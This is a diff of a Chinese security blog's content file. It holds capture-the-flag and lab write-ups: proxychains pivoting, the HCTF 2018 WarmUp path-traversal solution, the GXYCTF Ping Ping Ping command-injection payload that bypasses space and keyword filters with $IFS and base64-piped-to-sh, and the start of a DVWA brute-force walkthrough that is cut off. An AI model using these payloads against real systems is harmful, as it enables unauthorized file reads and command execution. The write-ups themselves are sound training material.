+<h2 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h2><p>这里使用<code>kali linux</code>示例</p>
+<p>编辑<code>/etc/proxychain.conf</code>文件，注释掉最后一句</p>
+<img src="nps/image-20200819152536104.png" alt="image-20200819152536104" style="zoom:50%;" />
+
+<p>添加一句<code>socks5 ip port username password</code></p>
+<p>其中，<code>username</code> 和 <code>password</code> 是新建客户端的时候使用的那个</p>
+<p>连接上去之后使用</p>
+<p><code>proxychains</code> + <code>[shell](例如 nmap 172.12.0.3)</code></p>
+<p>这里举例一个</p>
+<p><code>proxychains firefox</code></p>
+<img src="nps/image-20200819155154169.png" alt="image-20200819155154169" style="zoom:50%;" />
+
+<p>可以访问到</p>
+]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ACTF2020</title>
     <url>//buu_ACTF2020.html</url>
     <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
@@ -2176,109 +2262,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
 
 <p>得到了flag</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HCTF_2018_WarmUp</title>
-    <url>//buu_HCTF2018_WarmUp.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>要想达到文件包含</p>
-<ul>
-<li>变量<code>$file</code>不为空</li>
-<li><code>$file</code>要是一个字符串</li>
-<li>能够通过<code>emmm::checkfile</code></li>
-</ul>
-<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
-<ul>
-<li><code>$file</code>不为空</li>
-<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
-</ul>
-<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>告诉了<code>flag</code>存放的位置</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
-<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
-<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019_Ping Ping Ping</title>
-    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
-
-<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
-<p>使用<code>?ip=l;ls</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
-
-<p>尝试<code>cat flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
-
-<p>过滤了空格</p>
-<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
-<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
-<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
-
-<p>继续读<code>flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
-
-<p><code>flag</code>也被过滤了</p>
-<p>看一下<code>index.php</code>的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
-<p>使用<code>base64 -d</code>可以达到相同的作用</p>
-<p><code>payload</code>如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-
-<p>执行之后在注释里面看到<code>flag</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>web</category>
@@ -2343,6 +2326,109 @@
       <tags>
         <tag>pwn</tag>
         <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019_Ping Ping Ping</title>
+    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
+
+<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
+<p>使用<code>?ip=l;ls</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
+
+<p>尝试<code>cat flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
+
+<p>过滤了空格</p>
+<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
+<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
+<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
+
+<p>继续读<code>flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
+
+<p><code>flag</code>也被过滤了</p>
+<p>看一下<code>index.php</code>的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
+<p>使用<code>base64 -d</code>可以达到相同的作用</p>
+<p><code>payload</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>执行之后在注释里面看到<code>flag</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF_2018_WarmUp</title>
+    <url>//buu_HCTF2018_WarmUp.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>要想达到文件包含</p>
+<ul>
+<li>变量<code>$file</code>不为空</li>
+<li><code>$file</code>要是一个字符串</li>
+<li>能够通过<code>emmm::checkfile</code></li>
+</ul>
+<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
+<ul>
+<li><code>$file</code>不为空</li>
+<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
+</ul>
+<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>告诉了<code>flag</code>存放的位置</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
+<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
+<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
       </tags>
   </entry>
   <entry>
@@ -2752,61 +2838,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-brute-force</title>
-    <url>//brute-force.html</url>
-    <content><![CDATA[<p>dvwa靶场的暴力破解部分</p>
-<p>暴力破解取决于密码本</p>
-<p>好用的密码本事半功倍</p>
-<a id="more"></a>
-
-
-
-<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>甚至可以sql注入。</p>
-<p>在页面抓包之后选择<code>send to Intruder</code></p>
-<img src="dvwa-brute-force/image-20200721101658090.png" alt="image-20200721101658090" style="zoom:50%;" />
-
-<p>然后在<code>position</code>界面password地方增加标记，其他的标记清除</p>
-<img src="dvwa-brute-force/image-20200721102030788.png" alt="image-20200721102030788" style="zoom:50%;" />
-
-<p>前往payload界面，选择<code>payloads</code>，start attack即可</p>
-<img src="dvwa-brute-force/image-20200721102153217.png" alt="image-20200721102153217" style="zoom:50%;" />
-
-<p>发现一个返回长度不一样</p>
-<img src="dvwa-brute-force/image-20200721102255259.png" alt="image-20200721102255259" style="zoom:50%;" />
-
-<p>尝试登陆，成功</p>
-<img src="dvwa-brute-force/image-20200721102315065.png" alt="image-20200721102315065" style="zoom:50%;" />
-
-
-
-<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span 